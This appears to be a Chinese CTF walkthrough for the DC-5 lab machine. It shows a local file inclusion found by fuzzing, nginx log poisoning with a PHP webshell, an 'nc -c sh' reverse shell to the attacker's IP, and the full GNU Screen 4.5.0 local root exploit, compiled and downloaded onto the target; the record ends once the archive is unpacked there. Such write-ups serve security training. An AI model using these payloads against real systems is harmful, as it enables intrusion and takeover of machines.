# DC-5

### 信息手机

使用Arp扫描靶机目标IP

```
┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f5:d6:36, IPv4: 192.168.5.134
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.5.1     00:50:56:c0:00:08       VMware, Inc.
192.168.5.2     00:50:56:f6:37:b9       VMware, Inc.
192.168.5.141   00:0c:29:44:88:e5       VMware, Inc.
192.168.5.254   00:50:56:f4:0b:6d       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.939 seconds (132.03 hosts/sec). 5 responded
```

Nmap扫描目标开放端口

```
┌──(root㉿kali)-[~]
└─# nmap -sS -sV 192.168.5.141
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-18 02:09 EST
Nmap scan report for 192.168.5.141
Host is up (0.00046s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
80/tcp  open  http    nginx 1.6.2
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 00:0C:29:44:88:E5 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.00 seconds
```

先访问一下80端口,有一个提交表单&#x20;

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

将表单提交，注意观察Copyright ©这部分有变化，

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

说明是有参数能控制的，我们模糊测试一下

```
┌──(root㉿kali)-[~]
└─# wfuzz --hh 851 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://192.168.5.141/thankyou.php?FUZZ=haha
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.5.141/thankyou.php?FUZZ=haha
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000741:   200        42 L     63 W       835 Ch      "file"                                             

Total time: 265.5102
Processed Requests: 207643
Filtered Requests: 207642
Requests/sec.: 782.0527
```

跑出了file这个隐藏的参数 看看是否有LFI漏洞

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Nmap的扫描结果可以看到是nginx,尝试能否访问到它的日志文件

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

我们可以采用日志文件投毒的方式来获取shell，先往日志文件中写一个php木马

```
<?php system($_GET['cmd']) ?>
```

我们看看能否执行命令

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

没什么问题，生成一个反弹shell

```
nc -c sh 192.168.5.134 8888
```

用burp发送这个payload

```
GET /thankyou.php?file=/var/log/nginx/error.log&cmd=nc+-c+sh+192.168.5.134+8888 HTTP/1.1
Host: 192.168.5.141
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

┌──(root㉿kali)-[~]
└─# nc -lnvp 8888             
listening on [any] 8888 ...
connect to [192.168.5.134] from (UNKNOWN) [192.168.5.141] 42380
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


```

我们升级一下这个shell

```
python -c 'import pty; pty.spawn("/bin/bash")' 
www-data@dc-5:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 权限提升

先用find 命令查找一下具有超级属性的文件

```
www-data@dc-5:~/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/bin/screen-4.5.0
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/sbin/mount.nfs
```

我们去搜一下screen-4.5.0

```
┌──(root㉿kali)-[~]
└─# searchsploit screen 4.5.0

---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                     | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                               | linux/local/41152.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

存在本地权限提升漏洞，我们将这个保存下来并开启一个python服务

```
┌──(root㉿kali)-[~]
└─# searchsploit -m linux/local/41154.sh
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
    Codes: N/A
 Verified: True
File Type: Bourne-Again shell script, ASCII text executable
Copied to: /root/41154.sh

┌──(root㉿kali)-[~]
└─# python3 -m http.server 7777                
Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
```

该漏洞利用有 3 个步骤。两个编译，一个是漏洞利用。

```
┌──(root㉿kali)-[~]
└─# cat 41154.sh 
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

保存这个文件 libhax.c

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

保存rootshell.c

```
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

保存41154.sh

```
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

在本地计算机上运行 libhax.c 和 rootshell.c

```
┌──(root㉿kali)-[~/Desktop/test/DC-5]
└─# gcc -fPIC -shared -ldl -o libhax.so libhax.c
libhax.c: In function ‘dropshell’:
libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
      |

┌──(root㉿kali)-[~/Desktop/test/DC-5]
└─# gcc -o rootshell rootshell.c
rootshell.c: In function ‘main’:
rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
```

现在我们有五个文件了，打包一下给它传到靶机

```
┌──(root㉿kali)-[~/Desktop/test/DC-5]
└─# ls    
41154.sh  libhax.c  libhax.so  rootshell  rootshell.c


┌──(root㉿kali)-[~/Desktop/test/DC-5]
└─# tar -zcvf exploit.tar.gz *                   
41154.sh
libhax.c
libhax.so
rootshell
rootshell.c
```

在靶机中下载这个文件

```
www-data@dc-5:/tmp$ wget http://192.168.5.134:7777/exploit.tar.gz
wget http://192.168.5.134:7777/exploit.tar.gz
converted 'http://192.168.5.134:7777/exploit.tar.gz' (ANSI_X3.4-1968) -> 'http://192.168.5.134:7777/exploit.tar.gz' (UTF-8)
--2023-12-20 02:05:56--  http://192.168.5.134:7777/exploit.tar.gz
Connecting to 192.168.5.134:7777... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4091 (4.0K) [application/gzip]
Saving to: 'exploit.tar.gz'

exploit.tar.gz      100%[=====================>]   4.00K  --.-KB/s   in 0s     

2023-12-20 02:05:56 (407 MB/s) - 'exploit.tar.gz' saved [4091/4091]

www-data@dc-5:/tmp$ tar -zxvf exploit.tar.gz
tar -zxvf exploit.tar.gz
41154.sh
libhax.c
libhax.so
rootshell
rootshell.c

www-data@dc-5:/tmp$ ls  
ls
41154.sh  exploit.tar.gz  libhax.c  libhax.so  rootshell  rootshell.c
```

